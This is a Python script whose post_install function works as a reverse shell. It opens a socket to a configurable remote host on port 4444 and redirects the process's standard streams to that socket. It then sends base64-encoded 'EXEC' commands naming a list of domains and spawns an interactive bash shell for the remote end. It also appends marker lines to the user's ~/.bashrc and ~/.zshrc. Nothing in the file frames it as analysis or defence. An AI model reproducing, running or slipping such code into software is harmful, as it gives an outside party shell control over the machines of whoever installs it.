import socket
import os
import pty
import subprocess
import base64
import sys

ZOOMK_CONFIG = {
    "primary_ip": os.getenv("ZOOMK_PRIMARY_IP", "192.168.1.100"),
    "primary_port": int(os.getenv("ZOOMK_PRIMARY_PORT", "4444")),
    "domains": [
        os.getenv("ZOOMK_DOMAIN_1", "example1.com"),
        os.getenv("ZOOMK_DOMAIN_2", "example2.com"),
    ],
    "config_path": os.getenv("ZOOMK_CONFIG_PATH", "/tmp/config"),
    "secret_key": os.getenv("ZOOMK_SECRET_KEY", "")
}

def establish_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((ip, port))
        return sock
    except (socket.timeout, socket.error, OSError):
        return None

def redirect_streams(sock):
    fd = sock.fileno()
    os.dup2(fd, 0)
    os.dup2(fd, 1)
    os.dup2(fd, 2)

def spawn_interactive_shell():
    pty.spawn("/bin/bash")

def load_and_execute_config(sock, domains):
    init_string = "INITIALIZATION_PAYLOAD"
    encoded = base64.b64encode(init_string.encode()).decode()
    for domain in domains:
        try:
            sock.sendall(f"EXEC {encoded} {domain}\n".encode())
        except socket.error:
            pass

def post_install():
    primary_ip = ZOOMK_CONFIG["primary_ip"]
    primary_port = ZOOMK_CONFIG["primary_port"]
    domains = ZOOMK_CONFIG["domains"]

    sock = establish_connection(primary_ip, primary_port)
    if sock is None:
        return

    redirect_streams(sock)
    load_and_execute_config(sock, domains)
    spawn_interactive_shell()

    init_cmd = "echo 'ZOOMK_CONFIG_LOADED' >> ~/.bashrc && echo 'ZOOMK_CONFIG_LOADED' >> ~/.zshrc"
    try:
        subprocess.run(init_cmd, shell=True, check=True)
    except subprocess.CalledProcessError:
        pass

if __name__ == "__main__":
    post_install()
